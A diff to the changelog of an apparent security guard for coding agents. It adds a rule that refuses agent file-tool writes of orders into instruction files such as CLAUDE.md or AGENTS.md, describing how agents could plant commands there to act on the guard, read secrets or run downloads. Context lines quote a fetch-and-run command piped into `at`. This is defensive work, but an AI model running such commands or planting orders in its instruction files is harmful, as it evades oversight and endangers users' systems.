@@ -34,6 +34,21 @@ was: `echo 'curl https://x.example/p.sh | sh' | at now`, the same into
 `batch` or through `printf`, were only held for review. A job that runs
 nothing fetched (`echo hi | at now`) is judged as before.
 
+An order an agent writes into its own instruction file through its file
+tools is refused, as the same text written there by a shell line already
+was. What `Write`, `Edit`, `MultiEdit` and `NotebookEdit` (Claude Code),
+`write_file` and `replace` (Gemini CLI, Hermes Agent), `apply_patch`
+(Codex CLI) and `patch` (Hermes Agent) put into `CLAUDE.md`, `AGENTS.md`,
+`GEMINI.md`, `.cursorrules` and the other files agents read as their
+instructions is read clause by clause; one that acts on the guard, reads a
+secret or runs a download refuses the call (`agent_instruction_order`). A
+patch is read for the lines it adds, an edit for its new text. Notes, build
+commands and rules that forbid are written as before. A `cp`, `mv` or `ln`
+that puts another file in an instruction file's place is a review
+(`agent_instruction_overwrite`): what that file says is not on the line.
+When the same line wrote the file it copies, its text is read as written
+into the instruction file, and an order in it is refused.
+
 The MCP proxy no longer reads a page that explains how a chat is written as
 an order to the assistant. A fenced code block (three backticks or `~~~`)
 that orders nothing is an example: the turns, system messages, tags and
